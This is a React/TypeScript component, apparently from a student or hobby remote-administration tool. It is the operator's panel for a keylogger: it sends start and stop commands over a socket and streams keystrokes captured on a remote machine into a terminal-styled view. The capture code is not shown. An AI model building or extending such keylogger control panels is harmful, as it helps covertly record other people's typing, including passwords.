// file: client/src/components/KeyloggerCard.tsx

import { useState, useEffect, useRef } from 'react';
import { Keyboard, Play, Square, Trash2, Download } from 'lucide-react';
import { useSocket } from '../contexts/SocketContext';
import { sendCommand } from '../services/socketService';

export default function KeyloggerCard() {
    const [isLogging, setIsLogging] = useState(false);
    const [logs, setLogs] = useState<string>("");
    const { socket, isConnected } = useSocket();
    const logContainerRef = useRef<HTMLDivElement>(null);

    // --- SỬA LẠI LOGIC LẮNG NGHE ---
    useEffect(() => {
        if (!socket) return;

        // 1. Lắng nghe PHÍM GÕ (Kênh riêng: ReceiveKey)
        socket.on("ReceiveKey", (key: string) => {
            // Chỉ cộng dồn ký tự, không thêm giờ giấc để nhìn tự nhiên
            setLogs(prev => prev + key);
        });

        // 2. (Tùy chọn) Lắng nghe trạng thái Bật/Tắt để hiện thông báo
        socket.on("ReceiveLog", (msg: string) => {
            if (msg.includes("STARTED")) {
                setLogs(prev => prev + "\n\n--- [SESSION STARTED] ---\n");
            }
            if (msg.includes("STOPPED")) {
                setLogs(prev => prev + "\n--- [SESSION STOPPED] ---\n");
            }
        });

        return () => {
            socket.off("ReceiveKey");
            socket.off("ReceiveLog");
        };
    }, [socket]);

    // Auto scroll
    useEffect(() => {
        if (logContainerRef.current) {
            logContainerRef.current.scrollTop = logContainerRef.current.scrollHeight;
        }
    }, [logs]);

    const handleStartLogging = async () => {
        setIsLogging(true);
        setLogs(""); // Xóa trắng màn hình khi bắt đầu mới
        try {
            await sendCommand('start_keylog');
        } catch (err) {
            alert("Lỗi: " + err);
            setIsLogging(false);
        }
    };

    const handleStopLogging = async () => {
        setIsLogging(false);
        try {
            await sendCommand('stop_keylog');
        } catch (err) {
            alert("Lỗi: " + err);
        }
    };

    const clearLogs = () => setLogs("");

    return (
        <div className="glass-panel p-6 rounded-lg h-full flex flex-col">
            <div className="flex items-center justify-between mb-4">
                <h2 className="text-xl font-bold text-green-500 neon-glow-green tracking-wider flex items-center gap-2">
                    <Keyboard className="w-5 h-5" /> {'> KEYLOGGER_'}
                </h2>
                <div className="flex items-center gap-2">
                    <div className={`w-2 h-2 rounded-full ${isLogging ? 'bg-green-500 animate-pulse shadow-[0_0_10px_#10b981]' : 'bg-red-500'}`} />
                    <span className={`text-xs ${isLogging ? 'text-green-500' : 'text-red-500'}`}>
                        {isLogging ? 'CAPTURING' : 'IDLE'}
                    </span>
                </div>
            </div>

            {/* Màn hình Terminal */}
            <div
                ref={logContainerRef}
                className="terminal-window p-4 rounded-lg mb-4 flex-1 overflow-y-auto font-mono text-sm bg-black border border-green-500/30 shadow-inner min-h-[250px]"
            >
                <div className="text-green-500/60 mb-2 italic">
                    {'// Waiting for keystrokes...'}
                </div>

                {/* Nội dung phím gõ */}
                <pre className="text-green-500 leading-relaxed whitespace-pre-wrap font-mono break-all">
                    {logs}
                </pre>

                {isLogging && <span className="text-green-500 animate-pulse inline-block">█</span>}
            </div>

            {/* Buttons */}
            <div className="flex gap-3 mt-auto">
                <button
                    onClick={handleStartLogging}
                    disabled={isLogging || !isConnected}
                    className="flex-1 bg-black neon-border-green hover:bg-green-950/30 px-4 py-3 rounded transition-all disabled:opacity-50 flex justify-center gap-2"
                >
                    <Play className="w-4 h-4 text-green-500" />
                    <span className="text-green-500 font-bold text-sm">START</span>
                </button>

                <button
                    onClick={handleStopLogging}
                    disabled={!isLogging}
                    className="flex-1 bg-black neon-border-red hover:bg-red-950/30 px-4 py-3 rounded transition-all disabled:opacity-50 flex justify-center gap-2"
                >
                    <Square className="w-4 h-4 text-red-500" />
                    <span className="text-red-500 font-bold text-sm">STOP</span>
                </button>

                <button onClick={clearLogs} className="bg-black neon-border-red px-4 py-3 rounded transition-all">
                    <Trash2 className="w-4 h-4 text-red-500" />
                </button>
            </div>
        </div>
    );
}